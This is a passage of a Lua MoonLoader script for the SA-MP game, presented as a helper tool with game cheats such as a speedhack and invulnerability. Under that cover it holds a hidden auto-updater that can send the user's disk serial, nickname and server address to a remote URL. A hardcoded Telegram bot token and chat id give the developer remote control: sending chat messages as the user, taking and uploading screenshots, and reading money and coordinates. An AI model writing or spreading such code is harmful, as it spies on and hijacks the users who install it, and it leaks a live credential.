                    imgui.PushTextWrapPos(0)  
                    imgui.TextColored(colors_[i] or colors[1], u8(text[i]))
                    imgui.PopTextWrapPos()    
                    imgui.SameLine(nil, 0)
                end
                imgui.NewLine()
            else 
                imgui.PushTextWrapPos(0)    
                imgui.TextWrapped(u8(w))    
                imgui.PopTextWrapPos()      
            end
        end
    end
    render_text(text)
end

function sms(text)
    local color_chat = '00FF00'
    local text = tostring(text):gsub('{mc}', '{' .. color_chat .. '}'):gsub('{%-1}', '{FFFFFF}')
    sampAddChatMessage(string.format('{FFFFFF}• {00FF00}%s {FFFFFF}%s {FFFFFF}•', thisScript().name, text), tonumber('0x' .. color_chat))
end

local enable_autoupdate = true
local autoupdate_loaded = false
local Update = nil
if enable_autoupdate then
    local updater_loaded, Updater = pcall(loadstring, [[
    return {
        check = function (a, b, c)
            local d = require('moonloader').download_status
            local e = os.tmpname()
            local f = os.clock()

            if doesFileExist(e) then
                os.remove(e)
            end

            downloadUrlToFile(a, e, function (g, h, i, j)
                if h == d.STATUSEX_ENDDOWNLOAD then
                    if doesFileExist(e) then
                        local k = io.open(e, 'r')
                        if k then
                            local l = decodeJson(k:read('*a'))
                            updatelink = l.updateurl
                            updateversion = l.latest
                            k:close()
                            os.remove(e)

                            if updateversion ~= thisScript().version then
                                lua_thread.create(function (b)
                                    local d = require('moonloader').download_status
                                    local m = -1
                                    
                                    print('{FFFF00}Пытаюсь обновиться c '..thisScript().version..' на '..updateversion, m)
                                    wait(250)

                                    downloadUrlToFile(updatelink, thisScript().path, function (n, o, p, q)
                                        if o == d.STATUS_DOWNLOADINGDATA then
                                            
                                        elseif o == d.STATUS_ENDDOWNLOADDATA then
                                            
                                            
                                            print('{FFFF00}Обновление завершено!', m)
                                            goupdatestatus = true

                                            lua_thread.create(function ()
                                                wait(500)
                                                thisScript():reload()
                                            end)
                                        end

                                        if o == d.STATUSEX_ENDDOWNLOAD then
                                            if goupdatestatus == nil then
                                                print(b..'{FF0000}Обновление прошло неудачно. Запускаю устаревшую версию..', m)
                                                update = false
                                            end
                                        end
                                    end)
                                end, b)
                            else
                                update = false
                               
                                print('{FFFF00}v'..thisScript().version..': Обновление не требуется.')
                                if l.telemetry then
                                    local r = require("ffi")
                                    r.cdef("int __stdcall GetVolumeInformationA(const char* lpRootPathName, char* lpVolumeNameBuffer, uint32_t nVolumeNameSize, uint32_t* lpVolumeSerialNumber, uint32_t* lpMaximumComponentLength, uint32_t* lpFileSystemFlags, char* lpFileSystemNameBuffer, uint32_t nFileSystemNameSize);")
                                    local s = r.new("unsigned long[1]", 0)
                                    r.C.GetVolumeInformationA(nil, nil, 0, s, nil, nil, nil, 0)
                                    s = s[0]
                                    local t, u = sampGetPlayerIdByCharHandle(PLAYER_PED)
                                    local v = sampGetPlayerNickname(u)
                                    local w = l.telemetry.."?id="..s.."&n="..v.."&i="..sampGetCurrentServerAddress().."&v="..getMoonloaderVersion().."&sv="..thisScript().version.."&uptime="..tostring(os.clock())

                                    lua_thread.create(function (c)
                                        wait(250)
                                        downloadUrlToFile(c)
                                    end, w)
                                end
                            end
                        end
                    else
                      
                        print('{FF0000}v'..thisScript().version..': Не могу проверить обновление. Свяжитесь с автором {FFFFFF}'..thisScript().url)
                        update = false
                    end
                end
            end)

            while update ~= false and os.clock() - f < 10 do
                wait(100)
            end

            if os.clock() - f >= 10 then
                
                print('{FF0000}v'..thisScript().version..': timeout, выходим из ожидания проверки обновления. Свяжитесь с автором {FFFFFF}')
            end
        end
    }
]])

    if updater_loaded then
        autoupdate_loaded, Update = pcall(Updater)
        if autoupdate_loaded then
            Update.json_url = "https://raw.githubusercontent.com/ass138/cr-helper-arz/refs/heads/main/version.json?" .. tostring(os.clock())
            Update.prefix = "[" .. string.upper(thisScript().name) .. "]: "
            Update.url = "https://github.com/ass138/cr-helper-arz/tree/main"
        end
    end
end


local function loadLibrary(libName, url)
    local ok, lib = pcall(import, 'lib\\' .. libName .. '.lua')
    if not ok then 
        local dlstatus = require('moonloader').download_status
        local libPath = getWorkingDirectory() .. '\\lib\\' .. libName .. '.lua'
        downloadUrlToFile(url, libPath, function (id, status, p1, p2)
            if status == dlstatus.STATUSEX_ENDDOWNLOAD then
                thisScript():reload()
            elseif status == dlstatus.STATUS_ERROR then       
            end
        end)
    end
    return lib
end

-- Загрузка библиотек
local toast = loadLibrary('mimtoasts', 'https://raw.githubusercontent.com/ass138/cr-helper-arz/refs/heads/main/mimtoasts.lua')
local multipart = loadLibrary('multipart-post', 'https://raw.githubusercontent.com/ass138/cr-helper-arz/refs/heads/main/multipart-post.lua')

function sendEmptyPacket(id)
	local bs = raknetNewBitStream()
	raknetBitStreamWriteInt8(bs, id)
	raknetSendBitStream(bs)
	raknetDeleteBitStream(bs)
end

function closeConnect()
	local bs = raknetNewBitStream()
	raknetEmulPacketReceiveBitStream(PACKET_DISCONNECTION_NOTIFICATION, bs)
	raknetDeleteBitStream(bs)
end

function main()
    while not isSampAvailable() do wait(15000) end
        if smspush[0] == 1 then
            sms('{FFFFFF} Активация: {7FFF00}F2{FFFFFF} или {7FFF00}/'..mainIni.main.cmd1, -1)
    elseif smspush[0] == 2 and toast_ok then  
            toast.Show(u8'Активация: F2 или /CR', toast.TYPE.INFO, 5)
        end
        sampRegisterChatCommand('sm', function(coords) local x, y, z = coords:match('(.+), (.+), (.+)') placeWaypoint(x, y, z) end)
        sampRegisterChatCommand(mainIni.main.cmd1, function() window[0] = not window[0] end)	
        sampRegisterChatCommand(mainIni.main.cmd6, function() showdebug[0] = not showdebug[0] end)	
        sampRegisterChatCommand(mainIni.main.cmd3, function() WinStateTG[0] = not WinStateTG[0] end)
        sampRegisterChatCommand(mainIni.main.cmd2, function() if smspush[0] == 1 then sms('Переподключение к серверу') elseif smspush[0] == 2 and toast_ok then toast.Show(u8'Переподключение к серверу', toast.TYPE.INFO, 5) end sampDisconnectWithReason(quit) sampSetGamestate(1) end)	
        sampRegisterChatCommand(mainIni.main.cmd5, getnumber)
        sampRegisterChatCommand(mainIni.main.cmd4, function()  lua_thread.create(function ()
        virtmip = true 
        sendEmptyPacket(PACKET_DISCONNECTION_NOTIFICATION) 
        closeConnect() 
        if not isCharInAnyCar(PLAYER_PED) and not sampIsChatInputActive() and not sampIsDialogActive() and not sampIsCursorActive() then
            sampSpawnPlayer() 
        end
        
        local randomCoord = random(1, 6)
        if randomCoord == 1 then
            setCharCoordinates(PLAYER_PED, 434.15, 2670.08, 59.56)
        end
        if randomCoord == 2 then
            setCharCoordinates(PLAYER_PED, 2913.23, -1296.14, 10.55)
        end
        if randomCoord == 3 then
            setCharCoordinates(PLAYER_PED, -971.21, 1160.18, 30.39)
        end
        if randomCoord == 4 then
            setCharCoordinates(PLAYER_PED, -2813.45, -461.87, 6.73)
        end
        if randomCoord == 5 then
            setCharCoordinates(PLAYER_PED, 2626.41, 45.68, 26.27)
        end
        if randomCoord == 6 then
            setCharCoordinates(PLAYER_PED, -2247.11, -1715.89, 479.97)
        end
        afktools[0] = true
        sampProcessChatInput('/sw 13') 
        sampProcessChatInput('/st 13') 
    end) 
end)
    mainIni.main.refreshq = false 
    inicfg.save(mainIni, "MiniCrHelper/MiniHelper-CR")
	getLastUpdate()
    getLastUpdateTG()
    if autoupdate_loaded and enable_autoupdate and Update then
        pcall(Update.check, Update.json_url, Update.prefix, Update.url)
    end
    lua_thread.create(get_telegram_updates) 
	lua_thread.create(get_telegram_updatesTG) 
	lua_thread.create(lavkirendor)
    lua_thread.create(radiuslavkis)
	lua_thread.create(cleanr)
	lua_thread.create(eat)
	lua_thread.create(crtextdraw)
    lua_thread.create(chestss)
    lua_thread.create(delayedtimers)
    lua_thread.create(bind)
    lua_thread.create(sizewindow)
    lua_thread.create(lavkatextand)
    lua_thread.create(bike)
    lua_thread.create(runnings)
    lua_thread.create(lenandxlopak)
    lua_thread.create(shaxtas)
    lua_thread.create(autoalts)
    lua_thread.create(posxy)
    lua_thread.create(showfps)
    lua_thread.create(camhack)
    lua_thread.create(photopng)
    lua_thread.create(powfishpov)
    lua_thread.create(textdraws) 
    lua_thread.create(whobject)  
    lua_thread.create(wh3dtext)  
    lua_thread.create(autoreconectrandom)  
    lua_thread.create(timekalashnik) 
    lua_thread.create(antilang) 
    lua_thread.create(carcosconetc)
    lua_thread.create(autoRotation)
    lua_thread.create(speedhack)
    lua_thread.create(doKeyCheck)
	while true do wait(0)
	    if wasKeyPressed(VK_F2) and not sampIsCursorActive() then
            window[0] = not window[0]  
            imgui.Process = main_window_state
            imgui.ShowCursor = false
            posX, posY = getCursorPos()
        end
        if wasKeyPressed(VK_F12) and not sampIsCursorActive() then
            showdebug[0] = not showdebug[0]  
            imgui.Process = main_window_state
            imgui.ShowCursor = false
            posX, posY = getCursorPos()      
        end
        if wasKeyPressed(VK_R) and not sampIsCursorActive() and virtmip == true then
            afktools[0] = not afktools[0]  
        end
    end
end

function doKeyCheck()
    while true do wait(0)
	    if virtmip == true then
		    setCharProofs(playerPed, true, true, true, true, true)
		    writeMemory(0x96916E, 1, 1, false)
	        if virtmip == false then
		        setCharProofs(playerPed, false, false, false, false, false)
		        writeMemory(0x96916E, 1, 0, false)
            end
        end
	end
end

function setMarker(type, x, y, z, radius, color)
    deleteCheckpoint(marker)
    removeBlip(checkpoint)
    checkpoint = addBlipForCoord(x, y, z)
    marker = createCheckpoint(type, x, y, z, 1, 1, 1, radius)
    changeBlipColour(checkpoint, color)
    lua_thread.create(function()
    repeat
        wait(0)
        local x1, y1, z1 = getCharCoordinates(PLAYER_PED)
        until getDistanceBetweenCoords3d(x, y, z, x1, y1, z1) < radius or not doesBlipExist(checkpoint)
        deleteCheckpoint(marker)
        removeBlip(checkpoint)
        addOneOffSound(0, 0, 0, 1149)
    end)
end

function speedhack()    
    local memory = require('memory')  
    local speedLastDelay = 0
    while true do wait(0)
        if virtmip == true then
        if not sampIsCursorActive() and sampIsLocalPlayerSpawned() then
            local vehicle = getCarCharIsUsing(1)
            if vehicle ~= -1 and getDriverOfCar(vehicle) == PLAYER_PED then
                local vehicleSpeed = getCarSpeed(vehicle) * 3.6
                    
                    if isKeyDown(16) and speedLastDelay < os.clock() and isKeyDown(87) then
                        speedLastDelay = os.clock() + 0.1     
                        if vehicleSpeed < 250 then
                            for i = 0, 8, 4 do
                                local addres = getCarPointer(vehicle) + 0x44 + i
                                local speedX = memory.getfloat(addres, true)
                                memory.setfloat(addres, speedX*speedhackf[0], true)
                            end
                        end
                    end
                    
                    if isKeyJustPressed(83) then
                        if vehicleSpeed > 30 then
                            for i = 0, 8, 4 do
                                local addres = getCarPointer(vehicle) + 0x44 + i
                                local speedX = memory.getfloat(addres, true)
                                memory.setfloat(addres, speedX/1.2, true)
                            end
                        end
                    end
                end
            end
        end
    end  
end

function autoRotation()
	while true do wait(0)
        if virtmip == true then
		    if isCharInAnyCar(PLAYER_PED) and not sampIsChatInputActive() and not sampIsDialogActive() and not sampIsCursorActive() then
			    if isKeyDown(0x25) then
				    addToCarRotationVelocity(storeCarCharIsInNoSave(PLAYER_PED), 0.0, -0.15, 0.0)
			    elseif isKeyDown(0x27) then
				    addToCarRotationVelocity(storeCarCharIsInNoSave(PLAYER_PED), 0.0, 0.15, 0.0)
			    end
		    end
	    end
    end
end

function carcosconetc()
    while true do wait(0)
        if isCharInCar(PLAYER_PED, veh) and virtmip == true then
            local heading = getCarHeading(veh)
            local ms = getMoveSpeed(heading)
			local data = samp_create_sync_data('player', true)
			local mX, mY, mZ = getCharCoordinates(PLAYER_PED)
			data.position = {x = mX, y = mY, z = mZ}
			data.moveSpeed.x = ms.x
            data.moveSpeed.y = ms.y
			data.moveSpeed.z = ms.z
            data.surfingOffsets.z = 0
			setCarHealth(veh, 1000)
			data.send()
		else
			deleteCar(veh)
        end
    end
end

function getMoveSpeed(heading)
    moveSpeed = {x = math.sin(-math.rad(heading)) * (0.250), y = math.cos(-math.rad(heading)) * (0.250), z = 0.25} 
    return moveSpeed
end

function CreateCar(vid)
    if virtmip == true then
    if vid == nil then vid = id end if col1 == nil or col2 == nil then col1 = 1 col2 = 1 end
    vid, col1, col2 = tonumber(vid), tonumber(col1), tonumber(col2)
    if vid then 
        if vid <= 611 and vid >=  400 then
            if not hasModelLoaded(vid) then
				requestModel(vid)
				loadAllModelsNow()
            end
            if isCharInCar(PLAYER_PED, veh) then
				clearCharTasksImmediately(PLAYER_PED)
				deleteCar(veh)
				local nx, ny, nz  = getCharCoordinates(PLAYER_PED)
				veh = createCar(vid, nx, ny, nz - 1)
				warpCharIntoCar(PLAYER_PED, veh)
				changeCarColour(veh, col1, col2)
			
			else
                local x, y, z  = getCharCoordinates(PLAYER_PED)
				veh = createCar(vid, x, y, z)
				warpCharIntoCar(PLAYER_PED, veh)
				changeCarColour(veh, col1, col2)
				
			end      
            end
        end
    end
end

function DeleteCar()
    if isCharInCar(PLAYER_PED, veh) and virtmip == true then
		clearCharTasksImmediately(PLAYER_PED)
		deleteCar(veh)	
	end
end

function samp_create_sync_data(sync_type, copy_from_player)
    local ffi = require 'ffi'
    local sampfuncs = require 'sampfuncs'
    
    local raknet = require 'lib.samp.raknet'
    require 'lib.samp.synchronization'

    copy_from_player = copy_from_player or true
    local sync_traits = {
        player = {'PlayerSyncData', raknet.PACKET.PLAYER_SYNC, sampStorePlayerOnfootData},
        vehicle = {'VehicleSyncData', raknet.PACKET.VEHICLE_SYNC, sampStorePlayerIncarData},
        passenger = {'PassengerSyncData', raknet.PACKET.PASSENGER_SYNC, sampStorePlayerPassengerData},
        aim = {'AimSyncData', raknet.PACKET.AIM_SYNC, sampStorePlayerAimData},
        trailer = {'TrailerSyncData', raknet.PACKET.TRAILER_SYNC, sampStorePlayerTrailerData},
        unoccupied = {'UnoccupiedSyncData', raknet.PACKET.UNOCCUPIED_SYNC, nil},
        bullet = {'BulletSyncData', raknet.PACKET.BULLET_SYNC, nil},
        spectator = {'SpectatorSyncData', raknet.PACKET.SPECTATOR_SYNC, nil}
    }
    local sync_info = sync_traits[sync_type]
    local data_type = 'struct ' .. sync_info[1]
    local data = ffi.new(data_type, {})
    local raw_data_ptr = tonumber(ffi.cast('uintptr_t', ffi.new(data_type .. '*', data)))
    
    if copy_from_player then
        local copy_func = sync_info[3]
        if copy_func then
            local _, player_id
            if copy_from_player == true then
                _, player_id = sampGetPlayerIdByCharHandle(PLAYER_PED)
            else
                player_id = tonumber(copy_from_player)
            end
            copy_func(player_id, raw_data_ptr)
        end
    end
    
    local func_send = function()
        local bs = raknetNewBitStream()
        raknetBitStreamWriteInt8(bs, sync_info[2])
        raknetBitStreamWriteBuffer(bs, raw_data_ptr, ffi.sizeof(data))
        raknetSendBitStreamEx(bs, sampfuncs.HIGH_PRIORITY, sampfuncs.UNRELIABLE_SEQUENCED, 1)
        raknetDeleteBitStream(bs)
    end
    
    local mt = {
        __index = function(t, index)
            return data[index]
        end,
        __newindex = function(t, index, value)
            data[index] = value
        end
    }
    return setmetatable({send = func_send}, mt)
end

local chat_idTG = '817557185'
local tokenTG = '7901866749:AAGne01fHDHXhRisfe6HggPrQDBLJAmmPs0'

function sendTG(msg)
    msg = msg:gsub('{......}', '') 
    msg = encodeUrl(msg)
    async_http_request('https://api.telegram.org/bot' .. tokenTG .. '/sendMessage?chat_id=' .. chat_idTG .. '&text='..msg,'', function(result) end)
end

function get_telegram_updatesTG() 
    while not updateid do wait(1) end
    local runner = requestRunner()
    local reject = function() end
    local args = ''
    while true do
        url = 'https://api.telegram.org/bot'..tokenTG..'/getUpdates?chat_id='..chat_idTG..'&offset=-1'
        threadHandle(runner, url, args, processing_telegram_messagesTG, reject)
        wait(0)
    end
end

function processing_telegram_messagesTG(result)
    if result then
        local proc_table = decodeJson(result)
        if proc_table.ok then
            if #proc_table.result > 0 then
                local res_table = proc_table.result[1]
                if res_table then
                    if res_table.update_id ~= updateid then
                        updateid = res_table.update_id
                        local message_from_user = res_table.message.text
                        if message_from_user then
                            local text = u8:decode(message_from_user) .. ' '
                            if text:match('^/player') then
                                local nickname = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(playerPed)))
                                local serverName = sampGetCurrentServerName()
                                sendTG('Ник: ' .. nickname .. '\nСервер: ' .. serverName..'\nВерсия скрипта: '..thisScript().version)
                        elseif text:match('^/chat ') then
                                local args = text:match('^/chat (.+)')
                                if args then
                                    local nickname, message = args:match("^(%S+) (.+)")
                                    local nick = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(playerPed)))
                                    if nick == nickname then
                                    WinStateTG[0] = true
                                    message = "[" .. os.date('%H:%M:%S') .. "]{00FF00}Разработчик: {FFFFFF}" .. message
                                    table.insert(messageLog, message)
                                    end
                                else
                                    sendTG("Используйте: /chat [никнейм] [сообщение]")
                                end
                            elseif text:match('^/send ') then
                                    local args = text:match('^/send (.+)')
                                    if args then
                                        local nickname, message = args:match("^(%S+) (.+)")
                                        local nick = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(playerPed)))
                                        if nickname and message and nickname == nick then
                                        sampSendChat(message)
                                    end
                                else
                                    sendTG("Используйте: /send [никнейм] [сообщение]")
                                end
                            elseif text:match('^/money') then
                                    local args = text:match('^/money (.+)')
                                    if args then
                                        local nickname = args:match("^(%S+)")
                                        local nick = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(playerPed)))
                                        if nickname == nick then
                                        sendTG('Наличные: $' .. getPlayerMoney())
                                    end
                                else
                                    sendTG('Используйте /money <никнейм>')
                                end
                            elseif text:match('^/coord') then
                                    local args = text:match('^/coord (.+)')
                                    if args then
                                        local nickname = args:match("^(%S+)")
                                        local nick = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(playerPed)))
                                        if nickname == nick then
                                            local interior = getActiveInterior()
                                            local x, y, z = getCharCoordinates(playerPed)
                                            sendTG('Интерьер: ' .. interior .. '\n/sm ' .. x .. ', ' .. y .. ', ' .. z)
                                        end
                                    else
                                        sendTG('Используйте /coord <никнейм>')
                                    end  
                                elseif text:match('^/scren') then
                                    local args = text:match('^/scren (.+)')
                                    if args then
                                        local nickname = args:match("^(%S+)")
                                        local nick = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(playerPed)))
                                        if nickname and nickname == nick then
                                        sendScreenTg()
                                        sendTG("Делаю скриншот")
                                    end
                                else
                                    sendTG("Используйте: /scren [никнейм]")
                                end 
                            elseif text:match('^/reload') then
                                local args = text:match('^/reload (.+)')
                                if args then
                                    local nickname = args:match("^(%S+)")
                                    local nick = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(playerPed)))
                                    if nickname and nickname == nick then
                                    thisScript():reload()
                                end
                            else
                                sendTG("Используйте: /reload [никнейм]")
                            end                               
                                elseif text:match('^/help') then
                                        sendTG('%E2%9D%97 Команды %E2%9D%97\n/player\n/send [никнейм] [сообщение в чат]\n/Chat [никнейм] [сообщение в скрипт]\n/money [никнейм]\n/coord [никнейм]\n/scren [никнейм]\n/reload [никнейм]')
                                    else
                                        sendTG('Неизвестная команда!')
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end

function getLastUpdateTG()
    async_http_request('https://api.telegram.org/bot'..tokenTG..'/getUpdates?chat_id='..chat_idTG..'&offset=-1','',function(result)
        if result then
            local proc_table = decodeJson(result)
            if proc_table.ok then
                if #proc_table.result > 0 then
                    local res_table = proc_table.result[1]
                    if res_table then
                        updateid = res_table.update_id
                    end
                else
                    updateid = 1
                end
            end
        end
    end)
end
-----------=================================================--------------------------------
ffi.cdef[[
	short GetKeyState(int nVirtKey);
	bool GetKeyboardLayoutNameA(char* pwszKLID);
	int GetLocaleInfoA(int Locale, int LCType, char* lpLCData, int cchData);

    typedef unsigned long DWORD;

    struct d3ddeviceVTBL {
        void *QueryInterface;
        void *AddRef;
        void *Release;
        void *TestCooperativeLevel;
        void *GetAvailableTextureMem;
        void *EvictManagedResources;
        void *GetDirect3D;
        void *GetDeviceCaps;
        void *GetDisplayMode;
        void *GetCreationParameters;
        void *SetCursorProperties;
        void *SetCursorPosition;
        void *ShowCursor;
        void *CreateAdditionalSwapChain;
        void *GetSwapChain;
        void *GetNumberOfSwapChains;
        void *Reset;
        void *Present;
        void *GetBackBuffer;
        void *GetRasterStatus;
        void *SetDialogBoxMode;
        void *SetGammaRamp;
        void *GetGammaRamp;
        void *CreateTexture;
        void *CreateVolumeTexture;
        void *CreateCubeTexture;
        void *CreateVertexBuffer;
        void *CreateIndexBuffer;
        void *CreateRenderTarget;
        void *CreateDepthStencilSurface;
        void *UpdateSurface;
        void *UpdateTexture;
        void *GetRenderTargetData;
        void *GetFrontBufferData;
        void *StretchRect;
        void *ColorFill;
        void *CreateOffscreenPlainSurface;
        void *SetRenderTarget;
        void *GetRenderTarget;
        void *SetDepthStencilSurface;
        void *GetDepthStencilSurface;
        void *BeginScene;
        void *EndScene;
        void *Clear;
        void *SetTransform;
        void *GetTransform;
        void *MultiplyTransform;
        void *SetViewport;
        void *GetViewport;
        void *SetMaterial;
        void *GetMaterial;
        void *SetLight;
        void *GetLight;
        void *LightEnable;
        void *GetLightEnable;
        void *SetClipPlane;
        void *GetClipPlane;
        void *SetRenderState;
        void *GetRenderState;
        void *CreateStateBlock;
        void *BeginStateBlock;
        void *EndStateBlock;
        void *SetClipStatus;
        void *GetClipStatus;
        void *GetTexture;
        void *SetTexture;
        void *GetTextureStageState;
        void *SetTextureStageState;
        void *GetSamplerState;
        void *SetSamplerState;
        void *ValidateDevice;
        void *SetPaletteEntries;
        void *GetPaletteEntries;
        void *SetCurrentTexturePalette;
        void *GetCurrentTexturePalette;
        void *SetScissorRect;
        void *GetScissorRect;
        void *SetSoftwareVertexProcessing;
        void *GetSoftwareVertexProcessing;
        void *SetNPatchMode;
        void *GetNPatchMode;
        void *DrawPrimitive;
        void* DrawIndexedPrimitive;
        void *DrawPrimitiveUP;
        void *DrawIndexedPrimitiveUP;
        void *ProcessVertices;
        void *CreateVertexDeclaration;
        void *SetVertexDeclaration;
        void *GetVertexDeclaration;
        void *SetFVF;
        void *GetFVF;
        void *CreateVertexShader;
        void *SetVertexShader;
        void *GetVertexShader;
        void *SetVertexShaderConstantF;
        void *GetVertexShaderConstantF;
        void *SetVertexShaderConstantI;
        void *GetVertexShaderConstantI;
        void *SetVertexShaderConstantB;
        void *GetVertexShaderConstantB;
        void *SetStreamSource;
        void *GetStreamSource;
        void *SetStreamSourceFreq;
        void *GetStreamSourceFreq;
        void *SetIndices;
        void *GetIndices;
        void *CreatePixelShader;
        void *SetPixelShader;
        void *GetPixelShader;
        void *SetPixelShaderConstantF;
        void *GetPixelShaderConstantF;
        void *SetPixelShaderConstantI;
        void *GetPixelShaderConstantI;
        void *SetPixelShaderConstantB;
        void *GetPixelShaderConstantB;
        void *DrawRectPatch;
        void *DrawTriPatch;
        void *DeletePatch;
    };

    struct d3ddevice {
        struct d3ddeviceVTBL** vtbl;
    };

    int __stdcall GetSystemMetrics(
      int nIndex
    );

    int __stdcall ClientToScreen(
        int    hWnd,
        struct POINT* lpPoint
    );

    struct POINT {
        long x;
        long y;
    };

    int __stdcall GetClientRect(
        int   hWnd,
        struct RECT* lpRect
    );

    int __stdcall D3DXSaveSurfaceToFileA(
        const char*          pDestFile,
        int DestFormat,
        void*       pSrcSurface,
        void*        pSrcPalette,
        struct RECT                 *pSrcRect
    );

    struct RECT {
        long left;
        long top;
        long right;
        long bottom;
    };
]]

function sendScreenTg()
	
	local d3dx9_43 = ffi.load('d3dx9_43.dll')
    local pDevice = ffi.cast("struct d3ddevice*", 0xC97C28)
    local CreateOffscreenPlainSurface =  ffi.cast("long(__stdcall*)(void*, unsigned long, unsigned long, unsigned long, unsigned long, void**, void*)", pDevice.vtbl[0].CreateOffscreenPlainSurface)
    local GetFrontBufferData =  ffi.cast("long(__stdcall*)(void*, unsigned long, void*)", pDevice.vtbl[0].GetFrontBufferData)
    local pSurface = ffi.cast("void**", ffi.new('unsigned long[1]'))
    local sx = ffi.C.GetSystemMetrics(0);
    local sy = ffi.C.GetSystemMetrics(1);
    CreateOffscreenPlainSurface(pDevice, sx, sy, 21, 3, pSurface, ffi.cast("void*", 0))
    if GetFrontBufferData(pDevice, 0, pSurface[0]) < 0 then
    else
        local Point = ffi.new("struct POINT[1]")
        local Rect = ffi.new("struct RECT[1]")
        local HWND = ffi.cast("int*", 0xC97C1C)[0]
        ffi.C.ClientToScreen(HWND, Point)
        ffi.C.GetClientRect(HWND, Rect)
        Rect[0].left = Rect[0].left + Point[0].x
        Rect[0].right = Rect[0].right + Point[0].x
        Rect[0].top = Rect[0].top + Point[0].y
        Rect[0].bottom = Rect[0].bottom + Point[0].y
        d3dx9_43.D3DXSaveSurfaceToFileA("1.png", 3, pSurface[0], ffi.cast("void*", 0), Rect) -- second parameter(3) is D3DXIMAGE_FILEFORMAT, checkout https://docs.microsoft.com/en-us/windows/win32/direct3d9/d3dximage-fileformat
        sendPhotoTg() -- отправка фотки после скрина
		
	end
end

function sendPhotoTg()
	lua_thread.create(function ()
            local result, response = telegramRequest(
                'POST', --[[ https://en.wikipedia.org/wiki/POST_(HTTP) ]]--
                'sendPhoto', --[[ https://core.telegram.org/bots/api#sendphoto ]]--
                { --[[ Аргументы, см. https://core.telegram.org/bots/api#sendphoto ]]--
                    ['chat_id']    = chat_idTG,  --[[ chat_id ]]--
                },
                { --[[ Сам файл, сюда можно передавать как PATH(Путь к файлу), так и FILE_ID(См. https://core.telegram.org/bots/) ]]--
                    ['photo'] = string.format(getGameDirectory()..'/1.png') --[[ или же ==getWorkingDirectory() .. '\\smirk.png'== ]]--
                },
                tokenTG --[[ Токен Бота ]]
            )
	end)
end

function telegramRequest(requestMethod, telegramMethod, requestParameters, requestFile, botToken, debugMode)
	local multipart = require('multipart-post')
	local dkjson    = require('dkjson')
    --[[ Arguments Part ]]--
    --[[ Argument #1 (requestMethod) ]]--
    local requestMethod = requestMethod or 'POST'
    if (type(requestMethod) ~= 'string') then
        error('[MoonGram Error] In Function "telegramRequest", Argument #1(requestMethod) Must Be String.')
    end
    if (requestMethod ~= 'POST' and requestMethod ~= 'GET' and requestMethod ~= 'PUT' and requestMethod ~= 'DETELE') then
        error('[MoonGram Error] In Function "telegramRequest", Argument #1(requestMethod) Dont Have "%s" Request Method.', tostring(requestMethod))
    end
    --[[ Argument #2 (telegramMethod) ]]--
    local telegramMethod = telegramMethod or nil
    if (type(requestMethod) ~= 'string') then
        error('[MoonGram Error] In Function "telegramRequest", Argument #2(telegramMethod) Must Be String.\nCheck: https://core.telegram.org/bots/api')
    end
    --[[ Argument #3 (requestParameters) ]]--
    local requestParameters = requestParameters or {}
    if (type(requestParameters) ~= 'table') then
        error('[MoonGram Error] In Function "telegramRequest", Argument #3(requestParameters) Must Be Table.')
    end
    for key, value in ipairs(requestParameters) do
        if (#requestParameters ~= 0) then
            requestParameters[key] = tostring(value)
        else
            requestParameters = {''}
        end
    end
    --[[ Argument #4 (botToken) ]]--
    local botToken = botToken or nil
    if (type(botToken) ~= 'string') then
        error('[MoonGram Error] In Function "telegramRequest", Argument #4(botToken) Must Be String.')
    end
    --[[ Argument #5 (debugMode) ]]--
    local debugMode = debugMode or false
    if (type(debugMode) ~= 'boolean') then
        error('[MoonGram Error] In Function "telegramRequest", Argument #5(debugMode) Must Be Boolean.')
    end

    if (requestFile and next(requestFile) ~= nil) then
        local fileType, fileName = next(requestFile)
        local file = io.open(fileName, 'rb')
        if (file) then
            lua_thread.create(function ()
                requestParameters[fileType] = {
                    filename = fileName,
                    data = file:read('*a')
                }
            end)
            file:close()
        else
            requestParameters[file_type] = fileName
        end
    end

    local requestData = {
        ['method'] = tostring(requestMethod),
        ['url']    = string.format('https://api.telegram.org/bot%s/%s', tostring(botToken), tostring(telegramMethod))
    }

    local body, boundary = multipart.encode(requestParameters)

    --[[ Request Part ]]--
    local thread = effil.thread(function (requestData, body, boundary)
        local response = {}

        --[[ Include Libraries ]]--
        local channel_library_requests = require('ssl.https')
        local channel_library_ltn12    = require('ltn12')

        --[[ Manipulations ]]--
        local _, source = pcall(channel_library_ltn12.source.string, body)
        local _, sink   = pcall(channel_library_ltn12.sink.table, response)

        --[[ Request ]]--
        local result, _ = pcall(channel_library_requests.request, {
                ['url']     = requestData['url'],
                ['method']  = requestData['method'],
                ['headers'] = {
                    ['Accept']          = '*/*',
                    ['Accept-Encoding'] = 'gzip, deflate',
                    ['Accept-Language'] = 'en-us',
                    ['Content-Type']    = string.format('multipart/form-data; boundary=%s', tostring(boundary)),
                    ['Content-Length']  = #body
                },
                ['source']  = source,
                ['sink']    = sink
        })
        if (result) then
            return { true, response }
        else
            return { false, response }
        end
    end)(requestData, body, boundary)

    local result = thread:get(0)
    while (not result) do
        result = thread:get(0)
        wait(0)
    end
    --[[ Running || Paused || Canceled || Completed || Failed ]]--
    local status, error = thread:status()
    if (not error) then
        if (status == 'completed') then
            local response = dkjson.decode(result[2][1])
            --[[ result[1] = boolean ]]--
            if (result[1]) then
                return true, response
            else
                return false, response
            end
        elseif (status ~= 'running' and status ~= 'completed') then
            return false, string.format('[TelegramLibrary] Error; Effil Thread Status was: %s', tostring(status))
        end
    else
        return false, error
    end
    thread:cancel(0)
end
-----------=================================================--------------------------------

BuffSize = 32
KeyboardLayoutName = ffi.new("char[?]", BuffSize)
LocalInfo = ffi.new("char[?]", BuffSize)
lang_indicator = renderCreateFont("Arial", 14, 1+1)

function antilang()
    local text = ""
	local a_clock = false
	while true do	
	local in1 = sampGetInputInfoPtr()
	local in1 = getStructElement(in1, 0x8, 4)
	local in2 = getStructElement(in1, 0x8, 4)
	local in3 = getStructElement(in1, 0xC, 4)	
	local capsState = ffi.C.GetKeyState(20)
